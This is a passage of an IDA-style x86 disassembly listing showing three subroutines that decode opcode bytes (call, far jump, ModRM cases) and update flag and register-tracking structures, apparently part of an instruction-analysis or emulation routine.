		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 7
		jz	short loc_407A08
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		jge	short loc_4079EB
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407A08

loc_4079EB:				; CODE XREF: sub_4076E0+2FEj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		jle	short loc_407A01
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jz	short loc_407A08

loc_407A01:				; CODE XREF: sub_4076E0+314j
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A08:				; CODE XREF: sub_4076E0+2F3j
					; sub_4076E0+309j ...
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A0F:				; CODE XREF: sub_4076E0+154j
					; sub_4076E0+160j ...
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		mov	al, [eax]
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A1C:				; CODE XREF: sub_4076E0+17Fj
					; sub_4076E0+1AAj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		cmp	byte ptr [eax],	0
		jnz	short loc_407A44
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+60h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407A44
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+5Ch]
		cmp	byte ptr [eax],	0
		jnz	short loc_407A44
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A44:				; CODE XREF: sub_4076E0+345j
					; sub_4076E0+350j ...
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A4B:				; CODE XREF: sub_4076E0+111j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		setnl	al
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A5C:				; CODE XREF: sub_4076E0+25j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+58h]
		mov	dx, [edx]
		and	edx, 0FFh
		cmp	edx, 0D9h
		jg	short loc_407AA7
		jz	loc_407AFF
		cmp	edx, 8Dh
		jg	short loc_407A92
		jz	short loc_407AE1
		sub	edx, 62h
		jz	short loc_407AE1
		sub	edx, 2Ah
		jz	short loc_407AEE
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407A92:				; CODE XREF: sub_4076E0+39Fj
		sub	edx, 8Eh
		jz	short loc_407AEE
		add	edx, 0FFFFFFCAh
		sub	edx, 2
		jb	short loc_407AE1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407AA7:				; CODE XREF: sub_4076E0+391j
		cmp	edx, 0DFh
		jg	short loc_407AC9
		jz	loc_407B7F
		sub	edx, 0DAh
		jz	short loc_407B36
		dec	edx
		jz	loc_407B5E
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407AC9:				; CODE XREF: sub_4076E0+3CDj
		sub	edx, 0FEh
		jz	loc_407BA0
		dec	edx
		jz	loc_407BAE
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407AE1:				; CODE XREF: sub_4076E0+3A1j
					; sub_4076E0+3A6j ...
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		mov	al, [eax]
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407AEE:				; CODE XREF: sub_4076E0+3ABj
					; sub_4076E0+3B8j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 5
		setle	al
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407AFF:				; CODE XREF: sub_4076E0+393j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407B2F
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		mov	al, [eax]
		add	al, 2Fh
		sub	al, 7
		jb	short loc_407B28
		add	al, 0F6h
		sub	al, 2
		jb	short loc_407B28
		add	al, 0FEh
		sub	al, 2
		jb	short loc_407B28
		sub	al, 7
		jnz	short loc_407B2F

loc_407B28:				; CODE XREF: sub_4076E0+436j
					; sub_4076E0+43Cj ...
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B2F:				; CODE XREF: sub_4076E0+428j
					; sub_4076E0+446j
		mov	al, 1
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B36:				; CODE XREF: sub_4076E0+3DBj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407B5A
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		mov	al, [eax]
		sub	al, 0E8h
		jz	short loc_407B53
		add	al, 0FEh
		sub	al, 6
		jnb	short loc_407B5A

loc_407B53:				; CODE XREF: sub_4076E0+46Bj
		xor	eax, eax
		jmp	loc_407BDC	; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B5A:				; CODE XREF: sub_4076E0+45Fj
					; sub_4076E0+471j
		mov	al, 1
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B5E:				; CODE XREF: sub_4076E0+3DEj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407B7B
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		mov	al, [eax]
		add	al, 1Bh
		sub	al, 3
		jnb	short loc_407B7B
		xor	eax, eax
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B7B:				; CODE XREF: sub_4076E0+487j
					; sub_4076E0+495j
		mov	al, 1
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B7F:				; CODE XREF: sub_4076E0+3CFj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407B9C
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		mov	al, [eax]
		add	al, 1Fh
		sub	al, 7
		jnb	short loc_407B9C
		xor	eax, eax
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407B9C:				; CODE XREF: sub_4076E0+4A8j
					; sub_4076E0+4B6j
		mov	al, 1
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407BA0:				; CODE XREF: sub_4076E0+3EFj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 1
		setle	al
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407BAE:				; CODE XREF: sub_4076E0+3F6j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 7
		jge	short loc_407BD6
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_407BDA
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		mov	eax, [eax]
		sub	eax, 3
		jz	short loc_407BD6
		sub	eax, 2
		jnz	short loc_407BDA

loc_407BD6:				; CODE XREF: sub_4076E0+4D7j
					; sub_4076E0+4EFj
		xor	eax, eax
		jmp	short loc_407BDC ; jumptable 00407731 default case
; ---------------------------------------------------------------------------

loc_407BDA:				; CODE XREF: sub_4076E0+4E2j
					; sub_4076E0+4F4j
		mov	al, 1

loc_407BDC:				; CODE XREF: sub_4076E0+14j
					; sub_4076E0+4Bj ...
		pop	ebp		; jumptable 00407731 default case
		retn
sub_4076E0	endp

; ---------------------------------------------------------------------------
		align 10h
dword_407BE0	dd 300030h		; DATA XREF: sub_4076E0+23Dr
		align 10h
		dd 0D144D144h, 88D144h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407BF8	proc near		; CODE XREF: sub_408368+17Bp

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+54h]
		test	byte ptr [eax+1], 10h
		jz	loc_407C9E
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+7], 1
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-8]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+0Ch], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-8]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+20h]
		add	eax, [edx]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+1Ch]
		add	eax, [edx]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+8], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+20h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+14h], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		mov	ax, [eax]
		add	eax, 0FFFFFF20h
		sub	ax, 4
		setb	al
		xor	al, 1
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+18h], al
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		cmp	word ptr [eax],	0E8h
		jnz	short loc_407C91
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+5], 1
		jmp	loc_407E74
; ---------------------------------------------------------------------------

loc_407C91:				; CODE XREF: sub_407BF8+88j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+6], 1
		pop	ebx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_407C9E:				; CODE XREF: sub_407BF8+Ej
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		cmp	word ptr [eax],	0FFh
		jnz	loc_407E44
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		mov	eax, [eax]
		add	eax, 0FFFFFFFEh
		sub	eax, 4
		jnb	loc_407E44
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		mov	eax, [eax]
		add	eax, 0FFFFFFFEh
		sub	eax, 2
		jnb	short loc_407CDF
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+5], 1
		jmp	short loc_407CE9
; ---------------------------------------------------------------------------

loc_407CDF:				; CODE XREF: sub_407BF8+D9j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+6], 1

loc_407CE9:				; CODE XREF: sub_407BF8+E5j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_407D5A
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+34h]
		cmp	dword ptr [eax], 0
		jnz	short loc_407D5A
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+30h]
		cmp	dword ptr [eax], 4
		jnz	short loc_407D5A
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+2Ch]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+10h], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	dword ptr [eax+14h], 4
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+0Ch]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	edx, [eax+8]
		add	edx, 8
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	eax, [eax+10h]
		mov	eax, [eax]
		mov	ecx, 4
		call	sub_409CC0
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx], al
		jmp	loc_407E74
; ---------------------------------------------------------------------------

loc_407D5A:				; CODE XREF: sub_407BF8+FAj
					; sub_407BF8+105j ...
		mov	eax, [ebp+arg_0]
		cmp	byte ptr [eax+10h], 0
		jz	loc_407E74
		mov	eax, [ebp+arg_0]
		cmp	dword ptr [eax+14h], 0
		jz	loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		cmp	dword ptr [eax], 0FFFFFFFFh
		jz	loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		cmp	dword ptr [edx+eax*4], 0
		jz	loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+34h]
		cmp	dword ptr [eax], 0
		jnz	loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+30h]
		cmp	dword ptr [eax], 0
		jnz	loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jz	short loc_407E0A
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		mov	ebx, [edx+eax*4]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	[eax+10h], ebx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+0Ch]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	edx, [eax+8]
		add	edx, 8
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	eax, [ebx]
		mov	ecx, 4
		call	sub_409CC0
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx], al
		jmp	short loc_407E35
; ---------------------------------------------------------------------------

loc_407E0A:				; CODE XREF: sub_407BF8+1CAj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		mov	eax, [edx+eax*4]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+0Ch], eax
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+8]
		mov	[edx+8], eax

loc_407E35:				; CODE XREF: sub_407BF8+210j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	dword ptr [eax+14h], 4
		jmp	short loc_407E74
; ---------------------------------------------------------------------------

loc_407E44:				; CODE XREF: sub_407BF8+B1j
					; sub_407BF8+C5j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		cmp	word ptr [eax],	9Ah
		jnz	short loc_407E5D
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+5], 1
		jmp	short loc_407E74
; ---------------------------------------------------------------------------

loc_407E5D:				; CODE XREF: sub_407BF8+257j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		cmp	word ptr [eax],	0EAh
		jnz	short loc_407E74
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+8]
		mov	byte ptr [eax+6], 1

loc_407E74:				; CODE XREF: sub_407BF8+94j
					; sub_407BF8+15Dj ...
		pop	ebx
		pop	ebp
		retn
sub_407BF8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407E78	proc near		; CODE XREF: sub_408368+188p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+54h]
		mov	eax, [eax]
		and	eax, 0E000h
		cmp	eax, 8000h
		jz	short loc_407E9E
		cmp	eax, 0C000h
		jz	short loc_407E9E
		cmp	eax, 0E000h
		jnz	short loc_407EA8

loc_407E9E:				; CODE XREF: sub_407E78+16j
					; sub_407E78+1Dj
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx], ecx

loc_407EA8:				; CODE XREF: sub_407E78+24j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+44h]
		cmp	byte ptr [edx],	0
		jnz	short loc_407EDB
		cmp	eax, 4000h
		jz	short loc_407EC8
		cmp	eax, 0A000h
		jz	short loc_407EC8
		cmp	eax, 0C000h
		jnz	short loc_407EDB

loc_407EC8:				; CODE XREF: sub_407E78+40j
					; sub_407E78+47j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+40h]
		mov	edx, [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+14h]
		xor	ebx, ebx
		mov	[ecx+edx*4], ebx

loc_407EDB:				; CODE XREF: sub_407E78+39j
					; sub_407E78+4Ej
		cmp	eax, 2000h
		jz	short loc_407EE9
		cmp	eax, 0A000h
		jnz	short loc_407EFC

loc_407EE9:				; CODE XREF: sub_407E78+68j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+3Ch]
		mov	edx, [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+14h]
		xor	ebx, ebx
		mov	[ecx+edx*4], ebx

loc_407EFC:				; CODE XREF: sub_407E78+6Fj
		cmp	eax, 6000h
		jz	short loc_407F0A
		cmp	eax, 0E000h
		jnz	short loc_407F25

loc_407F0A:				; CODE XREF: sub_407E78+89j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		mov	ax, [eax]
		and	ax, 7
		movzx	eax, ax
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx

loc_407F25:				; CODE XREF: sub_407E78+90j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		cmp	word ptr [eax],	0FFh
		jbe	loc_4080C9
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		mov	ax, [eax]
		and	eax, 0FFh
		cmp	eax, 7Eh
		jge	short loc_407F6D
		sub	eax, 1
		jb	short loc_407F99
		jz	short loc_407FCF
		add	eax, 0FFFFFFD5h
		sub	eax, 2
		jb	loc_408005
		add	eax, 0FFFFFFFDh
		sub	eax, 3
		jb	loc_408037
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_407F6D:				; CODE XREF: sub_407E78+CFj
		add	eax, 0FFFFFF82h
		sub	eax, 2
		jb	loc_408047
		sub	eax, 22h
		jz	loc_40807D
		sub	eax, 18h
		jz	loc_408095
		sub	eax, 0Dh
		jz	loc_408037
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_407F99:				; CODE XREF: sub_407E78+D4j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 1
		jg	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_407FCF:				; CODE XREF: sub_407E78+D6j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408005:				; CODE XREF: sub_407E78+DEj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+60h]
		cmp	byte ptr [eax],	0
		jnz	short loc_40801F
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+5Ch]
		cmp	byte ptr [eax],	0
		jz	loc_408363

loc_40801F:				; CODE XREF: sub_407E78+196j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408037:				; CODE XREF: sub_407E78+EAj
					; sub_407E78+116j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+8], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408047:				; CODE XREF: sub_407E78+FBj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+5Ch]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_40807D:				; CODE XREF: sub_407E78+104j
		xor	eax, eax

loc_40807F:				; CODE XREF: sub_407E78+216j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		inc	eax
		cmp	eax, 4
		jnz	short loc_40807F
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408095:				; CODE XREF: sub_407E78+10Dj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 5
		jl	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		pop	ebx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4080C9:				; CODE XREF: sub_407E78+B8j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		movzx	eax, word ptr [eax]
		cmp	eax, 0ACh
		jge	short loc_40813D
		cmp	eax, 8Bh
		jg	short loc_408115
		jz	loc_408227
		sub	eax, 61h
		jz	loc_4081B9
		add	eax, 0FFFFFFF5h
		sub	eax, 2
		jb	loc_4081D1
		sub	eax, 2
		jb	loc_4081E1
		add	eax, 0FFFFFFF0h
		sub	eax, 4
		jb	loc_4081F1
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408115:				; CODE XREF: sub_407E78+266j
		sub	eax, 99h
		jz	loc_40825D
		add	eax, 0FFFFFFF5h
		sub	eax, 4
		jb	loc_40826D
		add	eax, 0FFFFFFFEh
		sub	eax, 2
		jb	loc_4081D1
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_40813D:				; CODE XREF: sub_407E78+25Fj
		cmp	eax, 0C8h
		jge	short loc_408171
		add	eax, 0FFFFFF54h
		sub	eax, 2
		jb	loc_4081E1
		sub	eax, 2
		jb	short loc_4081D1
		add	eax, 0FFFFFFF8h
		sub	eax, 8
		jb	loc_408288
		sub	eax, 7
		jz	loc_4082CB
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408171:				; CODE XREF: sub_407E78+2CAj
		cmp	eax, 0E0h
		jge	short loc_408194
		add	eax, 0FFFFFF38h
		sub	eax, 2
		jb	loc_4082BB
		sub	eax, 15h
		jz	loc_4082FE
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408194:				; CODE XREF: sub_407E78+2FEj
		add	eax, 0FFFFFF20h
		sub	eax, 3
		jb	loc_408315
		sub	eax, 14h
		jz	loc_408322
		sub	eax, 8
		jz	loc_40833A
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4081B9:				; CODE XREF: sub_407E78+271j
		xor	eax, eax

loc_4081BB:				; CODE XREF: sub_407E78+352j
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		inc	eax
		cmp	eax, 8
		jnz	short loc_4081BB
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4081D1:				; CODE XREF: sub_407E78+27Dj
					; sub_407E78+2BAj ...
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+1Ch], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4081E1:				; CODE XREF: sub_407E78+286j
					; sub_407E78+2D4j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+18h], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4081F1:				; CODE XREF: sub_407E78+292j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 7
		jz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408227:				; CODE XREF: sub_407E78+268j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		mov	eax, [edx+eax*4]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+3Ch]
		mov	edx, [edx]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx+14h]
		mov	[ecx+edx*4], eax
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_40825D:				; CODE XREF: sub_407E78+2A2j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+8], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_40826D:				; CODE XREF: sub_407E78+2AEj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+18h], edx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+1Ch], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_408288:				; CODE XREF: sub_407E78+2E5j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+58h]
		mov	ax, [eax]
		and	ax, 7
		movzx	eax, ax
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-8]
		mov	[edx+eax*4], ecx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4082BB:				; CODE XREF: sub_407E78+308j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+14h], edx
		jmp	loc_408363
; ---------------------------------------------------------------------------

loc_4082CB:				; CODE XREF: sub_407E78+2EEj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		cmp	byte ptr [eax],	0
		jnz	short loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-8]
		mov	[edx+eax*4], ecx
		jmp	short loc_408363
; ---------------------------------------------------------------------------

loc_4082FE:				; CODE XREF: sub_407E78+311j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+4Ch]
		cmp	byte ptr [eax],	0E0h
		jnz	short loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax], edx
		jmp	short loc_408363
; ---------------------------------------------------------------------------

loc_408315:				; CODE XREF: sub_407E78+324j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+4], edx
		jmp	short loc_408363
; ---------------------------------------------------------------------------

loc_408322:				; CODE XREF: sub_407E78+32Dj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 4
		jl	short loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+14h]
		xor	edx, edx
		mov	[eax+8], edx
		jmp	short loc_408363
; ---------------------------------------------------------------------------

loc_40833A:				; CODE XREF: sub_407E78+336j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+3Ch]
		cmp	dword ptr [eax], 1
		jg	short loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+44h]
		cmp	byte ptr [eax],	0
		jnz	short loc_408363
		mov	eax, [ebp+arg_0]
		mov	eax, [eax+40h]
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx+14h]
		xor	ecx, ecx
		mov	[edx+eax*4], ecx

loc_408363:				; CODE XREF: sub_407E78+F0j
					; sub_407E78+11Cj ...
		pop	ebx
		pop	ebp
		retn
sub_407E78	endp

; ---------------------------------------------------------------------------
		align 4

